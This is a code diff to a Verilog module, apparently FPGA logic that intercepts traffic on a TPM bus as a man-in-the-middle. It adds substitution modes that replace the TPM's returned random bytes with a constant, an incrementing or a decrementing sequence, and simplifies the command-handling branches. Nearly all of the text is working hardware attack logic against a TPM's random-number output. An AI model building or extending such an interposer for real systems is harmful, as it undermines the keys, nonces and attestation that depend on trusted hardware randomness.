@@ -8,7 +8,7 @@ module MitmLogic #(
 
 	// parameters
 	parameter NUM_DATA_BITS = 8,
-	parameter NUM_MITM_MODES = 2
+	parameter NUM_MITM_MODES = 4
 ) (
 
 	// system inputs
@@ -42,8 +42,10 @@ module MitmLogic #(
 );
 
 	// mode definitions
-	localparam MODE_FORWARD = 2'b01;
-	localparam MODE_SUB_CONST = 2'b10;
+	localparam MODE_FORWARD = 4'b0001;
+	localparam MODE_SUB_CONST = 4'b0010;
+	localparam MODE_SUB_INC = 4'b0100;
+	localparam MODE_SUB_DEC = 4'b1000;
 	
 	reg [NUM_MITM_MODES-1:0] mode = MODE_FORWARD;
 	
@@ -104,10 +106,7 @@ module MitmLogic #(
 					if (if0_tpm_rw_ctr == 3'd4 && if1_tpm_rw_ctr == 3'd4) begin
 						if0_tpm_rw_ctr <= 3'd0;
 						if1_tpm_rw_ctr <= 3'd0;
-						if (tpm_rw_cmd[31] == 1'b0) begin
-							state <= STATE_TPM_WAIT_STATE;
-						end
-						else if (tpm_wait_state == 8'h00) begin
+						if (tpm_wait_state == 8'h00) begin
 							state <= STATE_TPM_WAIT_STATE;
 						end
 						else begin
@@ -129,19 +128,14 @@ module MitmLogic #(
 						if0_tpm_rw_ctr <= 3'd0;
 						if1_tpm_rw_ctr <= 3'd0;
 						if (tpm_wait_state != 8'h00) begin
-							if (tpm_rw_cmd[31] == 1'b0) begin
-								tpm_rw_size <= {1'b0, tpm_rw_cmd[30:24]};
-							end
-							else begin
-								tpm_rw_size <= {1'b0, tpm_rw_cmd[30:24]} + 1;
-							end
+							tpm_rw_size <= {1'b0, tpm_rw_cmd[30:24]} + 1;
 							state <= STATE_MITM_FORK;
 						end
 					end
 				end
 				
 				STATE_MITM_FORK: begin
-					if (mode_select != MODE_FORWARD && tpm_rw_cmd[31] == 1'b1 && tpm_rw_cmd[7:0] == 8'h24) begin
+					if (mode != MODE_FORWARD && tpm_rw_cmd[31] == 1'b1 && tpm_rw_cmd[7:0] == 8'h24) begin
 						state <= STATE_MITM_ATTACK;
 					end
 					else begin
@@ -166,7 +160,26 @@ module MitmLogic #(
 						end
 						else if (tpm_data_ctr < 16'd12 + tpm_rand_size) begin
 							if (fake_if0_send_ready == 1'b1) begin
-								fake_if0_send_data <= 8'haa;
+								case (mode)
+									
+									MODE_SUB_CONST: begin
+										fake_if0_send_data <= 8'haa;
+									end
+									
+									MODE_SUB_INC: begin
+										fake_if0_send_data <= tpm_data_ctr[7:0] - 8'd12;
+									end
+									
+									MODE_SUB_DEC: begin
+										fake_if0_send_data <= tpm_rand_size[7:0] - 8'd01 - (tpm_data_ctr[7:0] - 8'd12);
+									end
+									
+									default: begin
+										fake_if0_send_data <= 8'haa;
+									end
+									
+								endcase
+								
 								fake_if0_select <= 1'b1;
 								fake_if0_send_start <= 1'b1;
 								state <= STATE_FAKE_SEND_START;
